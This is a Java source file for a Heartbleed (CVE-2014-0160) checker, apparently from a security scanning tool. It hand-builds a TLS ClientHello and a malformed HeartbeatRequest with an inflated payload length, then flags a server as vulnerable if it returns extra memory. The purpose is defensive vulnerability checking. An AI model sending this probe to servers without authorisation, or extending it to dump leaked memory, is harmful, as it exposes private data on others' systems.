package it.r2u.anibus.service.analysis;

import java.io.DataInputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;

/**
 * Heartbleed Checker — CVE-2014-0160
 *
 * Sends a crafted TLS ClientHello (with heartbeat extension 0x000F),
 * waits for ServerHelloDone, then sends a malformed HeartbeatRequest
 * with an inflated payload_length. If the server replies with a heartbeat
 * response containing more data than we sent, it is leaking memory and
 * is therefore vulnerable to Heartbleed.
 *
 * This checker uses raw TCP sockets to construct TLS records manually.
 * No TLS stack is used (we build the wire bytes by hand).
 */
public class HeartbleedChecker {

    public record HeartbleedResult(
        String target,
        int port,
        boolean vulnerable,
        String detail
    ) {}

    private static final int CONNECT_TIMEOUT = 6000;
    private static final int READ_TIMEOUT    = 5000;

    // ── Prebuilt TLS 1.0 ClientHello with heartbeat extension (0x000F) ──
    // cipher: TLS_RSA_WITH_AES_128_CBC_SHA, session_id=empty, no compression
    private static final byte[] CLIENT_HELLO = hexToBytes(
        "16 03 01 00 dc"                // TLS record header: Handshake, TLS 1.0, length=0xdc
      + "01 00 00 d8"                   // Handshake: ClientHello, length=0xd8
      + "03 01"                         // client_version: TLS 1.0
      + "53 43 5b 90 9d 9b 72 0b bc 0c bc 2b 92 a8 48 97" // random (32 bytes)
      + "cf bd 39 04 cc 16 0a 85 03 90 9f 77 04 33 d4 de"
      + "00"                            // session_id_length=0
      + "00 66"                         // cipher_suites_length=102
      // 51 cipher suites
      + "c0 14 c0 0a c0 22 c0 21 00 39 00 38 00 88 00 87"
      + "c0 0f c0 05 00 35 00 84 c0 12 c0 08 c0 1c c0 1b"
      + "00 16 00 13 c0 0d c0 03 00 0a c0 13 c0 09 c0 1f"
      + "c0 1e 00 33 00 32 00 9a 00 99 00 45 00 44 c0 0e"
      + "c0 04 00 2f 00 96 00 41 c0 11 c0 07 c0 0c c0 02"
      + "00 05 00 04 00 15 00 12 00 09 00 14 00 11 00 08"
      + "00 06 00 03 00 ff"
      + "01"                            // compression_methods_length=1
      + "00"                            // no compression
      + "00 49"                         // extensions_length=73
      // heartbeat extension
      + "00 0f"                         // extension type: heartbeat (15)
      + "00 01"                         // extension data length=1
      + "01"                            // peer_allowed_to_send=1
      // renegotiation_info
      + "ff 01 00 01 00"
      // server_name
      + "00 00 00 0e 00 0c 00 00 09 6c 6f 63 61 6c 68 6f 73 74"
      // ec_point_formats
      + "00 0b 00 04 03 00 01 02"
      // elliptic_curves
      + "00 0a 00 0a 00 08 00 1d 00 17 00 19 00 18"
      // session_ticket
      + "00 23 00 00"
    );

    // Malformed HeartbeatRequest: type=0x01, payload_length=0x4000, payload=1 byte
    // TLS record: content_type=0x18, version=TLS 1.0, length=8 (1+2+1+4 padding)
    private static final byte[] HEARTBEAT_REQUEST = hexToBytes(
        "18 03 01"  // content type heartbeat, TLS 1.0
      + "00 08"     // record length = 8
      + "01"        // heartbeat type = request
      + "40 00"     // payload_length = 0x4000 (16384) — MUCH larger than actual payload
      + "61 61 61 61 61" // 5 bytes payload + padding
    );

    private static final int TLS_CONTENT_HEARTBEAT = 0x18;

    public HeartbleedResult check(String host, int port) {
        try (Socket socket = new Socket()) {
            socket.connect(new InetSocketAddress(host, port), CONNECT_TIMEOUT);
            socket.setSoTimeout(READ_TIMEOUT);

            OutputStream out = socket.getOutputStream();
            DataInputStream in = new DataInputStream(socket.getInputStream());

            // Send ClientHello
            out.write(CLIENT_HELLO);
            out.flush();

            // Read TLS records until we see ServerHelloDone (handshake type 0x0e)
            boolean gotHelloDone = waitForHelloDone(in);
            if (!gotHelloDone) {
                return new HeartbleedResult(host, port, false,
                    "Did not receive ServerHelloDone — TLS not supported or port filtered");
            }

            // Send malformed heartbeat
            out.write(HEARTBEAT_REQUEST);
            out.flush();

            // Read response — vulnerable servers return heartbeat with inflated data
            return readHeartbeatResponse(in, host, port);

        } catch (IOException e) {
            return new HeartbleedResult(host, port, false,
                "Connection error: " + e.getMessage());
        }
    }

    private boolean waitForHelloDone(DataInputStream in) throws IOException {
        // Read TLS records. ServerHelloDone = handshake type 14 (0x0e)
        int attempts = 0;
        while (attempts++ < 10) {
            int contentType = in.read();
            if (contentType < 0) break;
            in.readByte(); // major version
            in.readByte(); // minor version
            int length = Short.toUnsignedInt(in.readShort());
            if (length > 65536) break;
            byte[] data = new byte[length];
            in.readFully(data);
            if (contentType == 0x16 && data.length > 0) {
                // Handshake record: check for ServerHelloDone (type=14)
                if (data[0] == 0x0e) return true;
                // Also accept Certificate/ServerKeyExchange, keep reading
            } else if (contentType == 0x15) {
                // Alert — server closed
                break;
            }
        }
        return false;
    }

    private HeartbleedResult readHeartbeatResponse(DataInputStream in, String host, int port) {
        try {
            int contentType = in.read();
            if (contentType < 0) {
                return new HeartbleedResult(host, port, false,
                    "No response to heartbeat (server likely patched)");
            }
            in.readByte(); // major version
            in.readByte(); // minor version
            int length = Short.toUnsignedInt(in.readShort());
            byte[] data = new byte[Math.min(length, 65536)];
            in.readFully(data);

            if (contentType == TLS_CONTENT_HEARTBEAT) {
                if (length > 3) {
                    // length > 3 means server sent more than just type+empty_length — memory leak!
                    return new HeartbleedResult(host, port, true,
                        String.format(
                            "Server returned %d bytes in heartbeat response (sent 1 byte payload) — memory leaked!",
                            length));
                }
                return new HeartbleedResult(host, port, false,
                    "Heartbeat response returned only " + length + " bytes — likely patched");
            } else if (contentType == 0x15) {
                return new HeartbleedResult(host, port, false,
                    "Server sent TLS Alert in response (likely patched or heartbeat disabled)");
            }
            return new HeartbleedResult(host, port, false,
                "Unexpected content type 0x" + Integer.toHexString(contentType) + " in response");
        } catch (IOException e) {
            // Timeout / RST after heartbeat is also a sign of patched server
            return new HeartbleedResult(host, port, false,
                "No heartbeat response received (server may be patched)");
        }
    }

    private static byte[] hexToBytes(String hex) {
        String clean = hex.replaceAll("\\s+", "");
        byte[] bytes = new byte[clean.length() / 2];
        for (int i = 0; i < bytes.length; i++) {
            bytes[i] = (byte) Integer.parseInt(clean.substring(i * 2, i * 2 + 2), 16);
        }
        return bytes;
    }

    public static String formatReport(HeartbleedResult r) {
        StringBuilder sb = new StringBuilder();
        sb.append("═══════════════════════════════════════════════════════════\n");
        sb.append(String.format("  HEARTBLEED CHECK (CVE-2014-0160) — %s:%d\n", r.target(), r.port()));
        sb.append("═══════════════════════════════════════════════════════════\n\n");

        if (r.vulnerable()) {
            sb.append("  ⚠ VULNERABLE to Heartbleed!\n\n");
            sb.append("  ").append(r.detail()).append("\n\n");
            sb.append("  CVE  : CVE-2014-0160\n");
            sb.append("  Fix  : Upgrade OpenSSL to >= 1.0.1g\n");
            sb.append("  PoC  : https://www.exploit-db.com/search?cve=CVE-2014-0160\n");
        } else {
            sb.append("  ✓ NOT vulnerable (or heartbeat extension not supported)\n\n");
            sb.append("  ").append(r.detail()).append("\n");
        }
        return sb.toString();
    }
}
